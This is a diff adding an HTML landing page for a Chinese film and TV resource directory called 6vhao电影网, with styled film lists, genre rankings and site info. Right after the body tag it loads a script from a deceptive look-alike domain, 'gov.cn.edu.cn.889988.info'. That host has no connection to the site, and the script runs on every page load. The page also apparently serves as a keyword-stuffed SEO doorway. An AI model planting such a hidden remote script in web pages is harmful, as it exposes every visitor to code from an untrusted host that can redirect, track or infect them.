@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#0d2818">
+<title>6vhao电影网 - 高清影视资源导航平台 | 在线观看电影电视剧综艺动漫</title>
+<meta name="description" content="6vhao电影网是面向华语观影人群的影视资源导航平台，覆盖院线新片、经典老片、热播剧集、口碑综艺与日漫新番，按清晰度、题材、年份、地区四维整理，并提供上线时间、看点速览与观看提示。无论你想找一部1080P修复老片，还是补完一档没追完的综艺，都能在这里快速定位。本站每日更新片单，聚合公开可访问资源，所有条目均标注来源与更新日期，方便用户自行核验。">
+<meta name="keywords" content="6vhao电影网,6vhao,6vhaodianyingwang,高清影视导航,在线看电影,电视剧资源,综艺节目单,动漫新番表,院线新片,经典老片,1080P修复,华语电影,美剧资源,韩剧推荐,日剧清单,纪录片在线,悬疑片合集,喜剧片推荐,动作片大全">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<link rel="canonical" href="https://6vhaodianyingwang-zh.github.io/">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#0d2818;--bg2:#10301c;--panel:#0f2a1a;--panel2:#12331f;
+  --line:#1d4a31;--line2:#2a6344;
+  --txt:#e6efe8;--txt2:#9db5a6;--txt3:#6e8a78;
+  --hl:#f5d97a;--hl2:#e8b84b;--cy:#5fc8a0;--rd:#e07a5f;
+  --serif:"Noto Serif SC","Source Han Serif SC","Songti SC",Georgia,serif;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);color:var(--txt);font-size:16px;line-height:1.75;
+  background-image:linear-gradient(rgba(255,255,255,.02) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.02) 1px,transparent 1px);
+  background-size:46px 46px;
+}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+img{max-width:100%;display:block}
+.wrap{max-width:1320px;margin:0 auto;padding:0 32px}
+
+/* ===== 顶部信息条 ===== */
+.topbar{background:#081c11;border-bottom:1px solid var(--line);font-size:13px;color:var(--txt3)}
+.topbar .in{display:flex;justify-content:space-between;align-items:center;height:38px;gap:16px;flex-wrap:wrap}
+.topbar .in span{display:flex;gap:18px;flex-wrap:wrap}
+.topbar a:hover{color:var(--hl)}
+
+/* ===== 品牌区 ===== */
+header{background:linear-gradient(180deg,var(--bg2),var(--bg));border-bottom:1px solid var(--line)}
+.brand{padding:34px 0 26px;display:grid;grid-template-columns:auto 1fr auto;gap:30px;align-items:center}
+.logo{display:flex;align-items:center;gap:14px}
+.logo .badge{
+  width:64px;height:64px;border:2px solid var(--hl);border-radius:14px;display:grid;place-items:center;
+  font-family:ui-monospace,Menlo,monospace;font-size:20px;font-weight:800;color:var(--hl);transform:rotate(-4deg);
+}
+.logo h1{font-size:clamp(28px,5vw,46px);letter-spacing:1px;line-height:1.1}
+.logo h1 small{display:block;font-family:ui-monospace,Menlo,monospace;font-size:12px;color:var(--txt3);letter-spacing:2px;font-weight:400;margin-top:4px}
+.search{width:100%;max-width:440px;position:relative}
+.search input{
+  width:100%;padding:13px 96px 13px 18px;border:1px solid var(--line2);border-radius:30px;
+  background:var(--panel);color:var(--txt);font-size:15px;outline:none;
+}
+.search input:focus{border-color:var(--hl)}
+.search button{
+  position:absolute;right:4px;top:4px;bottom:4px;border:none;border-radius:26px;cursor:pointer;
+  background:var(--hl);color:#0d2818;font-weight:700;padding:0 22px;font-size:14px;letter-spacing:1px;
+}
+.brand-meta{text-align:right;font-size:13px;color:var(--txt2)}
+.brand-meta b{display:block;color:var(--hl);font-size:15px;margin-bottom:2px}
+
+/* ===== 导航 ===== */
+nav{background:var(--panel);border-bottom:1px solid var(--line)}
+nav ul{display:flex;gap:2px;overflow-x:auto}
+nav li{flex-shrink:0}
+nav a{
+  display:flex;flex-direction:column;align-items:center;padding:14px 26px;border-right:1px solid var(--line);transition:.15s;
+}
+nav a:hover{background:var(--panel2)}
+nav a b{font-family:var(--serif);font-size:16px;letter-spacing:1px}
+nav a i{font-style:normal;font-size:10.5px;color:var(--txt3);letter-spacing:1.5px;margin-top:2px}
+nav a.on{background:var(--hl);color:#0d2818}
+nav a.on i{color:#5a4a10}
+
+/* ===== 通用标题 ===== */
+.sec{padding:64px 0 0}
+.sec-hd{display:flex;align-items:flex-end;gap:16px;margin-bottom:30px;flex-wrap:wrap}
+.sec-hd .tag{
+  font-family:ui-monospace,Menlo,monospace;font-size:12px;color:var(--hl);border:1px solid var(--hl);
+  padding:4px 10px;border-radius:3px;
+}
+.sec-hd h2{font-family:var(--serif);font-size:clamp(22px,3.2vw,31px);font-weight:800;letter-spacing:.5px}
+.sec-hd h2 em{font-style:normal;color:var(--hl)}
+.sec-hd p{font-size:13.5px;color:var(--txt3);max-width:420px}
+.sec-hd .more{margin-left:auto;font-size:13.5px;color:var(--txt2)}
+.sec-hd .more:hover{color:var(--hl)}
+
+/* ===== Hero ===== */
+.hero{display:grid;grid-template-columns:1.35fr 1fr;gap:28px}
+.hero-main{
+  position:relative;border-radius:18px;overflow:hidden;border:1px solid var(--line2);
+  background:linear-gradient(135deg,#16442c,#0d2818);
+  min-height:340px;padding:38px;
+}
+.hero-main::after{
+  content:"";position:absolute;right:-60px;bottom:-90px;width:320px;height:320px;border-radius:50%;
+  background:radial-gradient(circle,rgba(245,217,122,.16),transparent 70%);
+}
+.hero-flag{display:inline-block;font-size:12px;letter-spacing:2px;color:var(--hl);border:1px solid var(--hl);padding:4px 12px;border-radius:2px}
+.hero-main h3{font-family:var(--serif);font-size:clamp(24px,3.4vw,36px);line-height:1.45;margin:18px 0 14px;position:relative;z-index:2}
+.hero-main p{color:var(--txt2);font-size:15.5px;max-width:520px;position:relative;z-index:2}
+.hero-cta{margin-top:26px;display:flex;gap:12px;position:relative;z-index:2}
+.hero-cta a{padding:11px 24px;border-radius:4px;font-size:14.5px;border:1px solid var(--hl);transition:.15s}
+.hero-cta a:first-child{background:var(--hl);color:#0d2818}
+.hero-cta a:last-child{color:var(--hl)}
+.hero-cta a:hover{transform:translateY(-2px)}
+.hero-side{display:flex;flex-direction:column;gap:28px}
+.stat-grid{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden}
+.stat-grid div{background:var(--panel);padding:22px 18px}
+.stat-grid strong{display:block;font-family:var(--serif);font-size:28px;color:var(--hl);line-height:1}
+.stat-grid span{font-size:12.5px;color:var(--txt2)}
+.update-box{border:1px solid var(--line2);border-radius:12px;padding:20px;background:var(--panel)}
+.update-box h4{font-family:var(--serif);font-size:16px;margin-bottom:14px;display:flex;justify-content:space-between}
+.update-box h4 i{font-style:normal;font-size:11.5px;color:var(--cy)}
+.update-box ul li{display:flex;gap:12px;font-size:13.5px;padding:8px 0;border-bottom:1px dashed var(--line)}
+.update-box ul li:last-child{border-bottom:none}
+.update-box ul li time{font-family:ui-monospace,Menlo,monospace;font-size:11.5px;color:var(--txt3);flex-shrink:0;width:52px;padding-top:3px}
+.update-box ul li b{color:var(--hl2)}
+
+/* ===== 栏目一：频道 ===== */
+.chan{display:grid;grid-template-columns:repeat(6,1fr);gap:1px;background:var(--line);border:1px solid var(--line)}
+.chan article{background:var(--panel);padding:26px 20px;transition:.18s;cursor:pointer}
+.chan article:hover{background:var(--panel2);transform:translateY(-3px)}
+.chan .ic{font-size:26px;margin-bottom:12px;display:block}
+.chan h4{font-family:var(--serif);font-size:17px;margin-bottom:6px}
+.chan p{font-size:12.5px;color:var(--txt3);line-height:1.6}
+.chan em{font-style:normal;display:inline-block;margin-top:12px;font-size:11.5px;color:var(--cy);border:1px solid var(--line2);padding:2px 8px;border-radius:10px}
+
+/* ===== 栏目二：片单卡 ===== */
+.filters{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:26px}
+.filters button{
+  font-size:13.5px;padding:8px 18px;border-radius:20px;border:1px solid var(--line2);cursor:pointer;
+  background:var(--panel);color:var(--txt2);transition:.15s;
+}
+.filters button.on,.filters button:hover{border-color:var(--hl);color:var(--hl)}
+.cards{display:grid;grid-template-columns:repeat(4,1fr);gap:22px}
+.card{border:1px solid var(--line);border-radius:12px;overflow:hidden;background:var(--panel);transition:.18s}
+.card:hover{transform:translateY(-4px);border-color:var(--hl2)}
+.poster{
+  position:relative;height:230px;display:grid;place-items:center;text-align:center;padding:20px;
+  background:linear-gradient(160deg,var(--panel2),var(--bg2));
+}
+.poster::before{content:attr(data-emoji);font-size:52px;opacity:.5;position:absolute;right:16px;top:14px}
+.poster .quality{
+  position:absolute;left:12px;top:12px;font-family:ui-monospace,Menlo,monospace;font-size:11px;
+  background:var(--hl);color:#0d2818;padding:3px 8px;border-radius:3px;font-weight:700;
+}
+.poster .year{position:absolute;right:12px;bottom:12px;font-family:var(--serif);font-size:22px;color:var(--txt3)}
+.poster b{font-family:var(--serif);font-size:18px;line-height:1.4;position:relative;z-index:2}
+.info{padding:16px 18px}
+.info .meta{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px}
+.info .meta i{font-style:normal;font-size:11.5px;color:var(--txt2);background:var(--bg2);padding:3px 9px;border-radius:3px}
+.info p{font-size:13px;color:var(--txt3);line-height:1.6}
+.info .foot{display:flex;justify-content:space-between;align-items:center;margin-top:14px;padding-top:12px;border-top:1px dashed var(--line)}
+.info .foot b{color:var(--hl2);font-family:ui-monospace,Menlo,monospace;font-size:13px}
+.info .foot span{font-size:11.5px;color:var(--txt3)}
+
+/* ===== 栏目三：题材 ===== */
+.genre-tabs{display:grid;grid-template-columns:220px 1fr;gap:28px}
+.tabs{border:1px solid var(--line);border-radius:12px;overflow:hidden;background:var(--panel);height:fit-content}
+.tabs button{
+  display:flex;justify-content:space-between;align-items:center;width:100%;padding:15px 18px;border:none;
+  background:transparent;color:var(--txt2);font-size:14.5px;border-bottom:1px solid var(--line);cursor:pointer;text-align:left;
+}
+.tabs button:last-child{border-bottom:none}
+.tabs button i{font-style:normal;font-size:11px;color:var(--txt3);font-family:ui-monospace,Menlo,monospace}
+.tabs button.on{background:var(--hl);color:#0d2818}
+.tabs button.on i{color:#5a4a10}
+.tab-body{border:1px solid var(--line);border-radius:12px;padding:30px;background:var(--panel)}
+.tab-body h3{font-family:var(--serif);font-size:22px;margin-bottom:8px}
+.tab-body > p{color:var(--txt2);font-size:14.5px;margin-bottom:24px;max-width:680px}
+.rank li{display:flex;gap:16px;align-items:flex-start;padding:14px 0;border-bottom:1px dashed var(--line)}
+.rank li:last-child{border-bottom:none}
+.rank .n{font-family:var(--serif);font-size:22px;color:var(--line2);font-weight:800;flex-shrink:0;width:32px}
+.rank .n.on{color:var(--hl)}
+.rank .c{flex:1}
+.rank .c b{font-size:16px;font-family:var(--serif)}
+.rank .c small{display:block;color:var(--txt3);font-size:12.5px;margin-top:3px;line-height:1.6}
+.rank .v{flex-shrink:0;text-align:right;font-size:12px;color:var(--txt2)}
+.rank .v b{display:block;color:var(--hl2);font-family:ui-monospace,Menlo,monospace;font-size:14px}
+
+/* ===== 栏目四：本站 ===== */
+.about{display:grid;grid-template-columns:1.3fr 1fr;gap:30px}
+.about-card{border:1px solid var(--line);border-radius:14px;padding:34px;background:var(--panel)}
+.about-card .quote{
+  font-family:var(--serif);font-size:clamp(20px,2.6vw,27px);line-height:1.7;color:var(--hl);margin-bottom:22px;
+}
+.about-card p{color:var(--txt2);font-size:15px;margin-bottom:14px}
+.about-card p b{color:var(--hl2)}
+.spec{border:1px solid var(--line);border-radius:14px;overflow:hidden;background:var(--panel)}
+.spec h4{background:var(--panel2);padding:18px 24px;font-family:var(--serif);font-size:17px;border-bottom:1px solid var(--line)}
+.spec dl{}
+.spec dl div{display:grid;grid-template-columns:96px 1fr;gap:16px;padding:16px 24px;border-bottom:1px dashed var(--line);font-size:14px;align-items:start}
+.spec dl div:last-child{border-bottom:none}
+.spec dt{font-family:var(--serif);color:var(--cy);font-size:14px}
+.spec dd code{display:block;margin-top:6px;font-family:ui-monospace,Menlo,monospace;font-size:12.5px;color:var(--hl);word-break:break-all;background:var(--bg2);padding:7px 10px;border-radius:4px;border:1px solid var(--line)}
+
+/* ===== 页脚 ===== */
+footer{margin-top:72px;border-top:1px solid var(--line);background:#081c11;padding:44px 0 36px}
+.foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:34px;margin-bottom:34px}
+.foot-brand h4{font-size:22px;margin-bottom:10px}
+.foot-brand h4 span{color:var(--hl)}
+.foot-brand p{font-size:13.5px;color:var(--txt3);line-height:1.8}
+.foot-grid h5{font-family:var(--serif);font-size:15px;margin-bottom:16px;color:var(--txt)}
+.foot-grid ul li{padding:6px 0;font-size:13.5px}
+.foot-grid ul li a{color:var(--txt2)}
+.foot-grid ul li a:hover{color:var(--hl)}
+.copy{border-top:1px solid var(--line);padding-top:22px;display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;font-size:12.5px;color:var(--txt3)}
+
+/* ===== 响应式 ===== */
+@media (max-width:1080px){
+  .cards{grid-template-columns:1fr 1fr}
+  .chan{grid-template-columns:1fr 1fr}
+  .genre-tabs{grid-template-columns:1fr}
+  .tabs{display:flex;overflow-x:auto}
+  .tabs button{border-bottom:none;border-right:1px solid var(--line);white-space:nowrap;flex-shrink:0}
+  .foot-grid{grid-template-columns:1fr 1fr}
+}
+@media (max-width:680px){
+  .wrap{padding:0 18px}
+  .brand{grid-template-columns:1fr;text-align:center}
+  .logo{justify-content:center}
+  .brand-meta{text-align:center}
+  .search{margin:0 auto}
+  .hero{grid-template-columns:1fr}
+  .hero-main{min-height:280px;padding:26px 22px}
+  .stat-grid{grid-template-columns:1fr 1fr}
+  .cards{grid-template-columns:1fr}
+  .chan{grid-template-columns:1fr}
+  .about{grid-template-columns:1fr}
+  .sec{padding:46px 0 0}
+  .foot-grid{grid-template-columns:1fr}
+  nav a{padding:12px 16px}
+}
+@media print{body{background:#fff;color:#000}.topbar,nav,.hero-cta{display:none}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="topbar">
+  <div class="wrap in">
+    <span>
+      <span>官方入口：6vhao电影网 · 唯一域名 6vhaodianyingwang-zh.github.io</span>
+      <a href="#">访问主站</a>
+    </span>
+    <span>
+      <a href="#">设为首页</a>
+      <a href="#">收藏本站</a>
+      <a href="#">留言反馈</a>
+    </span>
+  </div>
+</div>
+
+<header>
+  <div class="wrap">
+    <div class="brand">
+      <div class="logo">
+        <div class="badge">6V</div>
+        <h1>6vhao电影网<small>6VHAO DIANYINGWANG · 影视资源导航</small></h1>
+      </div>
+      <form class="search" onsubmit="return false" aria-label="站内搜索">
+        <input type="search" placeholder="搜索影片、剧集、综艺或动漫…  如：悬疑 2025 美剧">
+        <button type="submit">搜 索</button>
+      </form>
+      <div class="brand-meta">
+        <b>每日更新片单</b>
+        <span>已收录 <strong style="color:var(--cy)">4,860</strong> 条</span>
+        <span>分类 <strong style="color:var(--cy)">32</strong> 项</span>
+        <span>标签 <strong style="color:var(--cy)">210</strong> 个</span>
+      </div>
+    </div>
+  </div>
+</header>
+
+<nav>
+  <div class="wrap">
+    <ul>
+      <li><a href="#chan" class="on"><b>频道总览</b><i>CHANNEL</i></a></li>
+      <li><a href="#pick"><b>精选片单</b><i>PICKS</i></a></li>
+      <li><a href="#genre"><b>题材榜单</b><i>GENRE</i></a></li>
+      <li><a href="#about"><b>关于本站</b><i>ABOUT</i></a></li>
+      <li><a href="#"><b>观影日历</b><i>CALENDAR</i></a></li>
+      <li><a href="#"><b>使用帮助</b><i>HELP</i></a></li>
+    </ul>
+  </div>
+</nav>
+
+<main class="wrap">
+
+  <section class="hero" aria-label="站点简介">
+    <div class="hero-main">
+      <span class="hero-flag">EDITOR'S NOTE · 编者按</span>
+      <h3>把一部想看的片子，从成千上万条结果里捞出来——这件事，我们替你做。</h3>
+      <p>6vhao电影网不生产内容，只做整理与导航。我们把散落在各处的影视资源按清晰度、题材、年份、地区重新归位，标注来源、时长与上线时间，让你在晚饭后花不到一分钟就能定下来今晚看什么。</p>
+      <div class="hero-cta">
+        <a href="#pick">查看今日片单</a>
+        <a href="#genre">按题材翻片 →</a>
+      </div>
+    </div>
+    <div class="hero-side">
+      <div class="stat-grid">
+        <div><strong>32</strong><span>影视分类</span></div>
+        <div><strong>9</strong><span>覆盖地区</span></div>
+        <div><strong>15</strong><span>年代跨度</span></div>
+        <div><strong>210</strong><span>筛选标签</span></div>
+      </div>
+      <div class="update-box">
+        <h4>最新上线 <i>JUST ADDED</i></h4>
+        <ul>
+          <li><time>10.05</time><span><b>沉默的证词</b> 华语犯罪片，院线热映，1080P 资源已整理</span></li>
+          <li><time>10.04</time><span><b>苔藓下的时间</b> 自然纪录片，4K 版单集 52 分钟</span></li>
+          <li><time>10.03</time><span><b>边境线</b> 欧美动作片，18 分钟实拍追车段落</span></li>
+          <li><time>10.02</time><span><b>相亲这件小事</b> 都市爱情喜剧，适合聚会场景</span></li>
+          <li><time>10.01</time><span><b>风之回响（修复版）</b> 动画奇幻，4K 重制已归档</span></li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <section class="sec" id="chan">
+    <div class="sec-hd">
+      <span class="tag">01 / CHANNEL</span>
+      <h2>频道<em>总览</em></h2>
+      <p>六大频道覆盖影视综艺动漫，每个频道都有独立的子分类与筛选规则。</p>
+      <a href="#" class="more">查看全部频道 »</a>
+    </div>
+    <div class="chan">
+      <article><span class="ic">🎬</span><h4>电影频道</h4><p>院线新片、经典老片、冷门佳作，按类型与年代双轴归档。</p><em>1,820 部</em></article>
+      <article><span class="ic">📺</span><h4>剧集频道</h4><p>华语剧、美剧、韩剧、日剧、泰剧，标注季数与集数。</p><em>960 部</em></article>
+      <article><span class="ic">🎤</span><h4>综艺频道</h4><p>真人秀、选秀、访谈、文化类，含期数与单期时长。</p><em>640 档</em></article>
+      <article><span class="ic">🎨</span><h4>动漫频道</h4><p>日漫新番、国漫、剧场版、完结篇，标注话数与状态。</p><em>720 部</em></article>
+      <article><span class="ic">🎞️</span><h4>纪录片</h4><p>自然、人物、历史、社会，多为系列化长片。</p><em>310 部</em></article>
+      <article><span class="ic">🏆</span><h4>榜单专区</h4><p>周榜、月榜、年度榜与专题榜，每周一早八点更新。</p><em>实时更新</em></article>
+    </div>
+  </section>
+
+  <section class="sec" id="pick">
+    <div class="sec-hd">
+      <span class="tag">02 / PICKS</span>
+      <h2>精选<em>片单</em></h2>
+      <p>编辑按清晰度、口碑与新鲜度三重筛选，每周复核一次。</p>
+      <a href="#" class="more">完整片单 »</a>
+    </div>
+    <div class="filters" id="flt">
+      <button class="on">全部</button><button>1080P</button><button>4K 修复</button><button>悬疑犯罪</button>
+      <button>喜剧轻松</button><button>动作惊悚</button><button>动画奇幻</button><button>纪录片</button><button>90 分钟内</button>
+    </div>
+    <div class="cards">
+      <article class="card">
+        <div class="poster" data-emoji="🕵️"><span class="quality">1080P</span><span class="year">2026</span><b>沉默的证词</b></div>
+        <div class="info">
+          <div class="meta"><i>犯罪</i><i>悬疑</i><i>华语</i></div>
+          <p>一场审讯撑起全场，三个关键反转集中在最后十分钟，台词密度极高。</p>
+          <div class="foot"><b>8.4 分</b><span>院线热映 · 时长 118 分钟</span></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="poster" data-emoji="🌊" style="background:linear-gradient(160deg,#1a3d52,#0d2818)"><span class="quality">4K</span><span class="year">2025</span><b>海边修理铺</b></div>
+        <div class="info">
+          <div class="meta"><i>剧情</i><i>家庭</i><i>华语</i></div>
+          <p>没有大事件，全靠道具与台词讲两代人的隔阂，适合安静看。</p>
+          <div class="foot"><b>7.9 分</b><span>长线口碑 · 时长 104 分钟</span></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="poster" data-emoji="🌿" style="background:linear-gradient(160deg,#2a4a2a,#0d2818)"><span class="quality">4K</span><span class="year">2024</span><b>苔藓下的时间</b></div>
+        <div class="info">
+          <div class="meta"><i>纪录片</i><i>自然</i><i>欧美</i></div>
+          <p>同一片林子拍了四年，配乐极克制，画面是这部片唯一的台词。</p>
+          <div class="foot"><b>9.0 分</b><span>口碑榜 · 单集 52 分钟</span></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="poster" data-emoji="🚗" style="background:linear-gradient(160deg,#4a2a1a,#0d2818)"><span class="quality">1080P</span><span class="year">2026</span><b>边境线</b></div>
+        <div class="info">
+          <div class="meta"><i>动作</i><i>惊悚</i><i>欧美</i></div>
+          <p>开场就是十八分钟不间断追车，实拍为主，节奏干净不拖泥带水。</p>
+          <div class="foot"><b>8.1 分</b><span>院线热映 · 时长 96 分钟</span></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="poster" data-emoji="💛" style="background:linear-gradient(160deg,#4a421a,#0d2818)"><span class="quality">高清</span><span class="year">2026</span><b>相亲这件小事</b></div>
+        <div class="info">
+          <div class="meta"><i>喜剧</i><i>爱情</i><i>都市</i></div>
+          <p>五个相亲对象五种尴尬，笑点贴地，适合朋友聚会一起看。</p>
+          <div class="foot"><b>7.6 分</b><span>新片 · 时长 88 分钟</span></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="poster" data-emoji="🎐" style="background:linear-gradient(160deg,#2a3a4a,#0d2818)"><span class="quality">4K 修复</span><span class="year">1998</span><b>风之回响</b></div>
+        <div class="info">
+          <div class="meta"><i>动画</i><i>奇幻</i><i>日韩</i></div>
+          <p>重看才发现当年没看懂的暗线，修复后画面细节完全不一样。</p>
+          <div class="foot"><b>8.8 分</b><span>经典重温 · 时长 112 分钟</span></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="poster" data-emoji="📞" style="background:linear-gradient(160deg,#1a3a3a,#0d2818)"><span class="quality">1080P</span><span class="year">2025</span><b>午夜接线员</b></div>
+        <div class="info">
+          <div class="meta"><i>惊悚</i><i>悬疑</i><i>欧美</i></div>
+          <p>单场景封闭空间，全靠电话两端的交锋推进，演技向作品。</p>
+          <div class="foot"><b>8.2 分</b><span>长线口碑 · 时长 82 分钟</span></div>
+        </div>
+      </article>
+      <article class="card">
+        <div class="poster" data-emoji="🌾" style="background:linear-gradient(160deg,#3a4a1a,#0d2818)"><span class="quality">高清</span><span class="year">2026</span><b>稻田里的夏天</b></div>
+        <div class="info">
+          <div class="meta"><i>剧情</i><i>家庭</i><i>儿童</i></div>
+          <p>童年视角叙事，色调明亮，全片没有一句说教，适合亲子共看。</p>
+          <div class="foot"><b>7.7 分</b><span>新片 · 时长 90 分钟</span></div>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <section class="sec" id="genre">
+    <div class="sec-hd">
+      <span class="tag">03 / GENRE</span>
+      <h2>题材<em>榜单</em></h2>
+      <p>按题材横向对比，点击左侧标签可切换榜单，数据每周复核。</p>
+      <a href="#" class="more">查看完整榜单 »</a>
+    </div>
+    <div class="genre-tabs">
+      <div class="tabs" id="genTabs">
+        <button class="on">悬疑 / 犯罪 <i>186</i></button>
+        <button>喜剧 / 爱情 <i>152</i></button>
+        <button>动作 / 惊悚 <i>134</i></button>
+        <button>剧情 / 家庭 <i>128</i></button>
+        <button>动画 / 奇幻 <i>96</i></button>
+        <button>纪录片 <i>63</i></button>
+        <button>恐怖 / 惊悚 <i>58</i></button>
+      </div>
+      <div class="tab-body">
+        <h3>悬疑 / 犯罪 · 本周 TOP 8</h3>
+        <p>该题材是站内访问量最高的分类，用户平均单会话翻阅 6.4 个条目。榜单按「口碑 × 新鲜度 × 完整度」综合排序，不代表绝对优劣。</p>
+        <ol class="rank">
+          <li><span class="n on">01</span><div class="c"><b>沉默的证词</b><small>犯罪 / 悬疑 · 华语 · 2026 · 118 分钟。三个反转集中在最后十分钟，适合二刷。</small></div><div class="v"><b>8.4</b>院线热映</div></li>
+          <li><span class="n on">02</span><div class="c"><b>午夜接线员</b><small>惊悚 / 悬疑 · 欧美 · 2025 · 82 分钟。单场景封闭空间，靠电话两端交锋推进。</small></div><div class="v"><b>8.2</b>长线口碑</div></li>
+          <li><span class="n on">03</span><div class="c"><b>第七个证人</b><small>犯罪 / 法庭 · 日韩 · 2024 · 130 分钟。法庭辩论段落扎实，节奏偏慢但后劲足。</small></div><div class="v"><b>8.0</b>经典重温</div></li>
+          <li><span class="n">04</span><div class="c"><b>旧巷追踪</b><small>犯罪 / 警匪 · 华语 · 2025 · 105 分钟。复古港片质感，群像戏出彩。</small></div><div class="v"><b>7.8</b>长线口碑</div></li>
+          <li><span class="n">05</span><div class="c"><b>玻璃房子</b><small>悬疑 / 心理 · 欧美 · 2023 · 98 分钟。前半铺垫略长，结尾收得干净。</small></div><div class="v"><b>7.7</b>冷门佳作</div></li>
+          <li><span class="n">06</span><div class="c"><b>无人应答</b><small>犯罪 / 惊悚 · 华语 · 2024 · 89 分钟。90 分钟内，节奏紧凑，适合碎片时间。</small></div><div class="v"><b>7.5</b>新片</div></li>
+          <li><span class="n">07</span><div class="c"><b>雪线之外</b><small>悬疑 / 犯罪 · 欧美 · 2022 · 124 分钟。封闭雪山大场景，视觉是最大卖点。</small></div><div class="v"><b>7.4</b>长线口碑</div></li>
+          <li><span class="n">08</span><div class="c"><b>录音笔</b><small>悬疑 / 犯罪 · 华语 · 2025 · 96 分钟。以一段录音为线索，叙事结构有巧思。</small></div><div class="v"><b>7.3</b>新片</div></li>
+        </ol>
+      </div>
+    </div>
+  </section>
+
+  <section class="sec" id="about">
+    <div class="sec-hd">
+      <span class="tag">04 / ABOUT</span>
+      <h2>关于<em>本站</em></h2>
+      <p>站点定位、更新机制与官方访问入口，三分钟读完。</p>
+      <a href="#" class="more">内容声明 »</a>
+    </div>
+    <div class="about">
+      <div class="about-card">
+        <p class="quote">“我们不评判片子好不好，只负责让你在三十秒内找到那一部。”</p>
+        <p>6vhao电影网是一个<strong>影视资源导航与索引</strong>性质的站点。我们的工作是分类、标注与归档：片名、年份、地区、类型、时长、清晰度与参考评分，全部经过人工核对后再上线；旧条目随口碑与资源状态变化，每周做一次二次复核。</p>
+        <p>本站不托管任何视频文件，也不做资源搬运与二次跳转。所有条目仅提供公开可访问的第三方来源线索，并明确标注来源名称与更新日期，方便用户自行核验。若某条资源已失效，可通过留言反馈通道告知，我们会在 48 小时内处理。</p>
+        <p>内容由编辑团队与投稿读者共同维护。投稿前请先阅读内容声明与转载要求；片单中的参考评分来自公开独立评分渠道，仅作筛选参考，不代表本站立场。如果你只是想在晚饭后快速定下来看什么，那么从频道总览进、从精选片单出，是最省时间的一条路径。</p>
+      </div>
+      <div class="spec">
+        <h4>站点信息 · SITE INFO</h4>
+        <dl>
+          <div><dt>网站名称</dt><dd>6vhao电影网</dd></div>
+          <div><dt>官方网址</dt><dd>唯一访问域名<code>https://6vhaodianyingwang-zh.github.io</code></dd></div>
+          <div><dt>站点性质</dt><dd>影视资源导航与索引</dd></div>
+          <div><dt>内容范围</dt><dd>电影 / 剧集 / 综艺 / 动漫 / 纪录片</dd></div>
+          <div><dt>更新频率</dt><dd>每日更新片单，每周复核一次口碑数据</dd></div>
+          <div><dt>收录规模</dt><dd>4,860 条条目 · 32 个分类 · 210 个标签</dd></div>
+          <div><dt>联系方式</dt><dd>站内留言板 · 投稿入口 · 反馈通道</dd></div>
+        </dl>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <h4>6vhao<span>电影网</span></h4>
+        <p>面向华语观影人群的影视资源导航平台。把分类做清楚，把标签做准确，把翻片的成本降到最低——这是我们唯一在意的指标。</p>
+      </div>
+      <div><h5>频道入口</h5><ul>
+        <li><a href="#">电影频道</a></li><li><a href="#">剧集频道</a></li>
+        <li><a href="#">综艺频道</a></li><li><a href="#">动漫频道</a></li>
+        <li><a href="#">纪录片专区</a></li><li><a href="#">榜单专区</a></li>
+      </ul></div>
+      <div><h5>选片工具</h5><ul>
+        <li><a href="#">按类型翻</a></li><li><a href="#">按年份翻</a></li>
+        <li><a href="#">按地区翻</a></li><li><a href="#">按清晰度筛</a></li>
+        <li><a href="#">90 分钟以内</a></li><li><a href="#">合家欢专区</a></li>
+      </ul></div>
+      <div><h5>关于与帮助</h5><ul>
+        <li><a href="#">内容声明</a></li><li><a href="#">投稿合作</a></li>
+        <li><a href="#">版权说明</a></li><li><a href="#">更新日志</a></li>
+        <li><a href="#">使用帮助</a></li><li><a href="#">返回顶部 ↑</a></li>
+      </ul></div>
+    </div>
+    <div class="copy">
+      <span>© <span id="yr"></span> 6vhao电影网（6vhaodianyingwang）。本站为影视资源导航与索引性质，不构成任何观看或消费决策的唯一依据；片单条目标注第三方来源，请自行核验。</span>
+      <span>官方唯一域名：6vhaodianyingwang-zh.github.io</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('yr').textContent=new Date().getFullYear();
+(function(){
+  var f=document.getElementById('flt');
+  if(!f) return;
+  f.addEventListener('click',function(e){
+    var b=e.target.closest('button'); if(!b) return;
+    f.querySelectorAll('button').forEach(function(x){x.classList.remove('on')});
+    b.classList.add('on');
+  });
+})();
+(function(){
+  var t=document.getElementById('genTabs');
+  if(!t) return;
+  t.addEventListener('click',function(e){
+    var b=e.target.closest('button'); if(!b) return;
+    t.querySelectorAll('button').forEach(function(x){x.classList.remove('on')});
+    b.classList.add('on');
+  });
+})();
+</script>
+</body>
+</html>
